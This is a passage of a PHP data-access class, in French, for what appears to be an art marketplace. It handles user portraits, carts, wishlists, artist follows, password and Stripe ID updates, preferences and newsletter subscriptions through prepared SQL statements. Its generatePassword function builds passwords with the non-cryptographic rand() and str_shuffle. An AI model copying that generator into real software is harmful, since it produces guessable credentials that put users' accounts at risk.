				$SQLStmt->bindValue(':http_referer', $_SERVER['HTTP_REFERER'], PDO::PARAM_STR);
				$SQLStmt->bindValue(':remote_addr', $_SERVER['REMOTE_ADDR'], PDO::PARAM_STR);
				$SQLStmt->bindValue(':request_time', $_SERVER['REQUEST_TIME'], PDO::PARAM_INT);
				$SQLStmt->bindValue(':request_time_str', date('Y-m-d H:i:s', intval($_SERVER['REQUEST_TIME'])), PDO::PARAM_STR);
				return $SQLStmt->execute();
			}
			return false;
		}

		public static function updatePortrait(User $user): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
						UPDATE utilisateur
						SET photo = :photo, date_modif = CURRENT_DATE
						WHERE id_user=:id_user 
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':id_user', $user->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':photo', $user->getPhoto(), PDO::PARAM_STR);
			return $SQLStmt->execute();
		}

		public static function deletePortrait(User $user): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
						UPDATE utilisateur
						SET photo = null, date_modif = CURRENT_DATE
						WHERE id_user=:id_user 
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':id_user', $user->getId(), PDO::PARAM_INT);
			return $SQLStmt->execute();
		}

		public static function getPanier(User $user): ?Panier{
			$panier = DAOPanier::getByUserId($user->getId());
			if ($panier->getStatutPanier()->getId() == DAOStatutPanier::getByLibelle('Commandé')->getId()){
				$panier = null;
			}
			if (!is_null($panier)){
				$panier->setLignes(DAOPanier::getLignesByIdPanier($panier->getId()));
				$panier->setCartesCadeaux(DAOCarteCadeau::getByIdPanier($panier->getId()));
			}
			return $panier;
		}

		public static function getPanierActif(User $user): ?Panier{
			$panier = DAOPanier::getActiveCartByUserId($user->getId());
			if (!is_null($panier)){
				$panier->setLignes(DAOPanier::getLignesByIdPanier($panier->getId()));
				$panier->setCartesCadeaux(DAOCarteCadeau::getByIdPanier($panier->getId()));
			}
			return $panier;
		}

		public static function addToWishList(User $user, Oeuvre $oeuvre, ?ListeSouhait $listeSouhait = null): array{
			$conn = parent::getConnexion();
			if (is_null($listeSouhait)){
				$listeSouhait = new ListeSouhait('Ma liste', date_create('now'), true);
			}
			$error = false;
			if (BDD::openTransaction()){
				//Si cette liste n'existe pas pour l'utilisateur je la crée
				if (DAOListeSouhait::exists($listeSouhait, $user)){
					$listeSouhait = DAOListeSouhait::getByName('Ma Liste', $user);
				}else{
					DAOListeSouhait::insert($listeSouhait, $user);
				}
				$listeSouhait->setOeuvres(DAOListeSouhait::getOeuvres($listeSouhait));
				$mustAdd = true;
				foreach ($listeSouhait->getOeuvres() as $oeuvreInList){
					if ($oeuvre->getId() === $oeuvreInList->getId()){
						$mustAdd = false;
					}
				}
				if ($mustAdd){
					$listeSouhait->addOeuvre($oeuvre);
					if (!DAOListeSouhait::addOeuvre($listeSouhait, $oeuvre)){
						$error = true;
					}
				}
			}
			if ($error){
				BDD::rollbackTransaction();
			}else{
				BDD::commitTransaction();
			}
			return DAOListeSouhait::getAllOeuvresByUserId($user->getId());
		}

		public static function removeFromWishList(User $user, Oeuvre $oeuvre): array{
			$conn = parent::getConnexion();
			if (BDD::openTransaction()){
				$SQLQuery = "
					DELETE FROM composer_oeuvre_liste
					WHERE id_liste_souhait IN (SELECT id_liste_souhait FROM liste_souhait WHERE id_user = :id_user)
						AND id_oeuvre = :id_oeuvre
				";
				$SQLStmt = $conn->prepare($SQLQuery);
				$SQLStmt->bindValue(':id_user', $user->getId(), PDO::PARAM_INT);
				$SQLStmt->bindValue(':id_oeuvre', $oeuvre->getId(), PDO::PARAM_INT);
				if ($SQLStmt->execute()){
					BDD::commitTransaction();
				}else{
					BDD::rollbackTransaction();
				}
			}
			return DAOListeSouhait::getAllOeuvresByUserId($user->getId());
		}

		public static function getFollowList(User $user): array{
			$conn = parent::getConnexion();
			$SQLQuery = "
				SELECT id_artiste, id_user, date_suivi
				FROM user_artiste_suivi
				WHERE id_user = :id_user
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':id_user', $user->getId(), PDO::PARAM_INT);
			$SQLStmt->execute();
			$lesArtistesSuivis = [];
			while ($SQLRow = $SQLStmt->fetch(PDO::FETCH_ASSOC)){
				$lesArtistesSuivis[] = $SQLRow['id_artiste'];
			}
			$SQLStmt->closeCursor();
			return $lesArtistesSuivis;
		}

		public static function addToFollowList(User $user, Artiste $artiste): array{
			$conn = parent::getConnexion();
			$followList = DAOUser::getFollowList($user);
			if (!in_array($artiste->getId(), $followList)){
				if (BDD::openTransaction()){
					$SQLQuery = "
						INSERT INTO user_artiste_suivi(id_artiste, id_user, date_suivi) VALUES (:id_artiste, :id_user, CURRENT_DATE)
					";
					$SQLStmt = $conn->prepare($SQLQuery);
					$SQLStmt->bindValue(':id_artiste', $artiste->getId(), PDO::PARAM_INT);
					$SQLStmt->bindValue(':id_user', $user->getId(), PDO::PARAM_INT);
					if ($SQLStmt->execute()){
						BDD::commitTransaction();
						$followList[] = $artiste->getId();
					}else{
						BDD::rollbackTransaction();
					}
				}
			}
			return $followList;
		}

		public static function removeFromFollowList(User $user, Artiste $artiste): array{
			$conn = parent::getConnexion();
			if (BDD::openTransaction()){
				$SQLQuery = "
					DELETE FROM user_artiste_suivi
					WHERE id_user = :id_user
						AND id_artiste = :id_artiste
				";
				$SQLStmt = $conn->prepare($SQLQuery);
				$SQLStmt->bindValue(':id_user', $user->getId(), PDO::PARAM_INT);
				$SQLStmt->bindValue(':id_artiste', $artiste->getId(), PDO::PARAM_INT);
				if ($SQLStmt->execute()){
					BDD::commitTransaction();
				}else{
					BDD::rollbackTransaction();
				}
			}
			return DAOUser::getFollowList($user);
		}

		public static function updateStatut(User $user): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
						UPDATE utilisateur
						SET id_statut_user = :id_statut_user, date_modif = CURRENT_DATE
						WHERE id_user=:id_user 
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':id_user', $user->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':id_statut_user', $user->getStatut()->getId(), PDO::PARAM_INT);
			return $SQLStmt->execute();
		}

		public static function updateLastLogin(User $user): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
						UPDATE utilisateur
						SET last_login = CURRENT_TIMESTAMP
						WHERE id_user=:id_user 
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':id_user', $user->getId(), PDO::PARAM_INT);
			return $SQLStmt->execute();
		}

		public static function updatePassword(User $user, string $newPassword): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
						UPDATE utilisateur
						SET mot_de_passe = :mot_de_passe, date_modif = CURRENT_DATE
						WHERE id_user=:id_user
							AND mot_de_passe = :old_mot_de_passe
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':id_user', $user->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':mot_de_passe', password_hash($newPassword, PASSWORD_BCRYPT), PDO::PARAM_STR);
			$SQLStmt->bindValue(':old_mot_de_passe', $user->getPassword(), PDO::PARAM_STR);
			return $SQLStmt->execute();
		}

		public static function updateStripeCustomerId(User $user): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
						UPDATE utilisateur
						SET stripe_customer_id = :stripe_customer_id, date_modif = CURRENT_DATE
						WHERE id_user=:id_user 
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':id_user', $user->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':stripe_customer_id', $user->getStripeCustomerId(), PDO::PARAM_STR);
			return $SQLStmt->execute();
		}

		public static function updateStripeAccountId(User $user): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
						UPDATE utilisateur
						SET stripe_account_id = :stripe_account_id, date_modif = CURRENT_DATE
						WHERE id_user=:id_user 
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':id_user', $user->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':stripe_account_id', $user->getStripeAccountId(), PDO::PARAM_STR);
			return $SQLStmt->execute();
		}

		public static function updateDevisePreferee(User $user): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
						UPDATE utilisateur
						SET id_devise_preferee = :id_devise_preferee, date_modif = CURRENT_DATE
						WHERE id_user=:id_user 
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':id_user', $user->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':id_devise_preferee', $user->getDevisePreferee()->getId(), PDO::PARAM_INT);
			return $SQLStmt->execute();
		}

		public static function updateLocaleTrad(User $user): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
						UPDATE utilisateur
						SET id_default_locale = :id_default_locale, date_modif = CURRENT_DATE
						WHERE id_user=:id_user 
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':id_user', $user->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':id_default_locale', $user->getLocaleTrad()->getId(), PDO::PARAM_INT);
			return $SQLStmt->execute();
		}

		public static function updatePreferedUnit(User $user): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
						UPDATE utilisateur
						SET id_default_unit = :id_default_unit, date_modif = CURRENT_DATE
						WHERE id_user=:id_user 
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':id_user', $user->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':id_default_unit', $user->getPreferedUnit()->getId(), PDO::PARAM_INT);
			return $SQLStmt->execute();
		}

		public static function updateAllPrefs(User $user): bool{
			return self::updateLocaleTrad($user) && self::updateDevisePreferee($user) && self::updatePreferedUnit($user);
		}

		public static function insertNewsletter(User $user, Abonnement $abonnement): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "INSERT INTO user_abonnement(id_abonnement, id_user, date_debut, date_fin, actif)
								VALUES (:idabonnement, :iduser, :datedebut, :datefin, :actif)";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':idabonnement', $abonnement->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':iduser', $user->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':datedebut', $abonnement->getDateDebut(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':datefin', null, PDO::PARAM_NULL);
			$SQLStmt->bindValue(':actif', true, PDO::PARAM_BOOL);
			if (!$SQLStmt->execute()){
				return false;
			}else{
				return true;
			}
		}

		public static function updateActifNewsletter(User $user, Abonnement $abonnement, $actif): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "UPDATE user_abonnement
						SET actif = :actif
						WHERE id_user=:iduser AND id_abonnement=:idabonnement";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':idabonnement', $abonnement->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':iduser', $user->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':actif', $actif, PDO::PARAM_BOOL);
			if (!$SQLStmt->execute()){
				return false;
			}else{
				return true;
			}
		}

		public static function userHasNewsletter(User $user, int $abonnement): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
				SELECT COUNT(id_abonnement) as existe
				FROM user_abonnement
				WHERE id_user=:iduser AND id_abonnement=:idabonnement
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':idabonnement', $abonnement, PDO::PARAM_INT);
			$SQLStmt->bindValue(':iduser', $user->getId(), PDO::PARAM_INT);
			$SQLStmt->execute();
			$SQLRow = $SQLStmt->fetch(PDO::FETCH_ASSOC);
			$loginTrouve = $SQLRow['existe'];
			$SQLStmt->closeCursor();
			return ($loginTrouve>0);
		}

		/**
		 * fonction de génération d'un password lettres minuscules + majuscules + chiffre + caractère spéciaux (-?!@#$%^&*_+=.~)
		 * @return string
		 */
		public static function generatePassword(): string{
			// Définitions des groupes de caractères
			$minuscules = 'abcdefghijklmnopqrstuvwxyz';
			$majuscules = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
			$chiffres = '0123456789';
			$speciaux = '-?!@#$%^&*_+=.~';
			// Prendre au moins un caractère de chaque groupe
			$motDePasse = $minuscules[rand(0, strlen($minuscules) - 1)];
			$motDePasse .= $majuscules[rand(0, strlen($majuscules) - 1)];
			$motDePasse .= $chiffres[rand(0, strlen($chiffres) - 1)];
			$motDePasse .= $speciaux[rand(0, strlen($speciaux) - 1)];
			// Mélanger les groupes pour le reste des caractères
			$tousCaracteres = $minuscules . $majuscules . $chiffres . $speciaux;
			for ($i = 4; $i<12; $i++){
				$motDePasse .= $tousCaracteres[rand(0, strlen($tousCaracteres) - 1)];
			}
			// Mélanger le mot de passe pour éviter un ordre prévisible
			return str_shuffle($motDePasse);
		}
	}
